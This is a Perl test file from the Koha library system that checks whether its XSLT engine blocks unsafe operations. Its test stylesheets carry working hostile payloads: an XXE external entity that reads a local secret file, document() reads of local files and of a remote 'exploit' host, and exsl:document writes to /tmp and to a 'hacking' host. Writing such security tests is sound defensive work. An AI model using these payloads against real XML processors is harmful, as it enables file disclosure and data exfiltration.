#!/usr/bin/perl

# Copyright 2019 Rijksmuseum
#
# This file is part of Koha.
#
# Koha is free software; you can redistribute it and/or modify it under the
# terms of the GNU General Public License as published by the Free Software
# Foundation; either version 3 of the License, or (at your option) any later
# version.
#
# Koha is distributed in the hope that it will be useful, but WITHOUT ANY
# WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR
# A PARTICULAR PURPOSE.  See the GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License along
# with Koha; if not, write to the Free Software Foundation, Inc.,
# 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.

use Modern::Perl;
use File::Temp qw/tempfile/;
use Test::More tests => 7;
use Test::Warn;

use Koha::XSLT::Base;
use t::lib::Mocks;

t::lib::Mocks::mock_config( 'koha_xslt_security', { expand_entities => 1 } );
my $engine=Koha::XSLT::Base->new;

my $secret_file = mytempfile('Big secret');
my $xslt=<<"EOT";
<!DOCTYPE test [<!ENTITY secret SYSTEM "$secret_file">]>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:variable name="secret">&secret;</xsl:variable>
  <xsl:template match="/">
      <secret><xsl:value-of select="\$secret"/></secret>
  </xsl:template>
</xsl:stylesheet>
EOT
my $xslt_file = mytempfile($xslt);

my $output= $engine->transform( "<ignored/>", $xslt_file );
like($output, qr/Big secret/, 'external entity got through');

t::lib::Mocks::mock_config( 'koha_xslt_security', { expand_entities => 0 } );
$engine=Koha::XSLT::Base->new;
$output= $engine->transform( "<ignored/>", $xslt_file );
unlike($output, qr/Big secret/, 'external entity did not get through');

# Adding a document call to trigger callback for read_file
# Does not depend on expand_entities.
$xslt=<<"EOT";
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:template match="/">
      <read_file><xsl:copy-of select="document('file://$secret_file')"/></read_file>
  </xsl:template>
</xsl:stylesheet>
EOT
$xslt_file = mytempfile($xslt);
warnings_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
    [ qr/read_file called in XML::LibXSLT/, qr/runtime error/ ],
    'Triggered security callback for read_file';

# Trigger write_file
$xslt=<<"EOT";
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:template match="/">
      <exsl:document href="file:///tmp/breached.txt" omit-xml-declaration="yes" method="text"><xsl:text>Breached!</xsl:text></exsl:document>
  </xsl:template>
</xsl:stylesheet>
EOT
$xslt_file = mytempfile($xslt);
warnings_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
    [ qr/write_file called in XML::LibXSLT/, qr/runtime error/ ],
    'Triggered security callback for write_file';

# Trigger read_net
$xslt=<<"EOT";
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:template match="/">
      <xsl:copy-of select="document('http://bad.koha-community.org/dangerous/exploit.xsl')" />
  </xsl:template>
</xsl:stylesheet>
EOT
$xslt_file = mytempfile($xslt);
warnings_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
    [ qr/read_net called in XML::LibXSLT/, qr/runtime error/ ],
    'Triggered security callback for read_net';

# Trigger write_net
$xslt=<<"EOT";
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:exsl="http://exslt.org/common" extension-element-prefixes="exsl">
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:template match="/">
      <exsl:document href="http://hacking.koha-community.org/breached.txt" omit-xml-declaration="yes" method="html">
    <xsl:text>Breached!</xsl:text>
</exsl:document>
  </xsl:template>
</xsl:stylesheet>
EOT
$xslt_file = mytempfile($xslt);
warnings_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
    [ qr/write_net called in XML::LibXSLT/, qr/runtime error/ ],
    'Triggered security callback for write_net';

# Check remote import (include should be similar)
# Trusting koha-community.org DNS here ;)
# This should not trigger read_net but fail on the missing import.
$xslt=<<"EOT";
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
  <xsl:import href="http://notexpected.koha-community.org/noxsl/nothing.xsl"/>
  <xsl:output method="xml" encoding="UTF-8" version="1.0" indent="yes"/>
  <xsl:template match="/"/>
</xsl:stylesheet>
EOT
$xslt_file = mytempfile($xslt);
$engine->print_warns(1);
warning_like { $output= $engine->transform( "<ignored/>", $xslt_file ); }
    qr/I\/O warning : failed to load external entity/,
    'Remote import does not fail on read_net';

sub mytempfile {
    my ( $fh, $fn ) = tempfile( SUFFIX => '.xsl', UNLINK => 1 );
    print $fh $_[0]//'';
    close $fh;
    return $fn;
}
